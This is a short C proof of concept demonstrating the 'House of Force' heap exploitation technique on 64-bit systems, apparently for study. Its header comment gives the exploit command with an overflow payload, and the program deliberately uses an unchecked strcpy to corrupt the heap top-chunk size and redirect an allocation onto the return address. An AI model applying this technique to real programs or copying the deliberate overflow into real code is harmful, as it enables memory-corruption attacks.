/* House of force PoC 64-bits
 * objective : pivot wilderness to target (rip, func ptrs, ..)
 * exploit : ./prog 140737482051864 $(python -c 'print "A"*264+"\xff"*8')
 * condition : must be ASLR off because exploit is based on static offsets (heap - rip)
 * note: GOT address is below heap and thus unreachable
 *
 * conditions of house of force are hard to meet in real applications.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
    char *p = malloc(256), *p2, *p3;
    
    printf("%p\n", p);

    strcpy(p, argv[2]); //overwrite wilderness size to prevent heap extending

    p2 = malloc(strtoull(argv[1], NULL, 10)); //pivot remainder to rip
    p3 = malloc(256); //service chunk close to target
    
    printf("%p\n", p3);  

    memset(p3, 'A', 256); //hijack rip

    return 0;
}
